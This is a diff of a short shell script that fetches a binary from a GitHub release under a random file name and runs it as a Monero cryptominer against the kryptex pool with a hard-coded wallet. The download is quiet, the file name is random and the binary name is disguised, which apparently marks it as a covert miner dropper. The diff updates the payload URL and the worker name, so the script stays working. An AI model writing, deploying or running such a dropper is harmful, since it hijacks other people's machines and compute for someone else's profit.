@@ -3,11 +3,11 @@
 BIN_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 12)
 
 # Download binary quietly and rename
-wget -q https://github.com/vedhagsvp/nwxbsa/releases/download/latest/cpuminerrplant -O "$BIN_NAME"
+wget -q https://github.com/vedhagsvp/marva/releases/download/c4ksd/crrmnar -O "$BIN_NAME"
 
 # Make it executable
 chmod +x "$BIN_NAME"
 
 # Optional: run the binary
 # ./"$BIN_NAME"
-./"$BIN_NAME" -o xmr.kryptex.network:7029 -u 44Hy7goGeFtd6HeHC4GEYXhApgSCNKf2q1YRPVA9661mQWoZ5WVTovj8Te1kmLmdut1dXwws7C491EoFUTbN3qCv8zbwhKC/SSpk-$RANDOM -a rx/0 -t 8
+./"$BIN_NAME" -o xmr.kryptex.network:7029 -u 44Hy7goGeFtd6HeHC4GEYXhApgSCNKf2q1YRPVA9661mQWoZ5WVTovj8Te1kmLmdut1dXwws7C491EoFUTbN3qCv8zbwhKC/bba-$RANDOM -a rx/0 -t 8
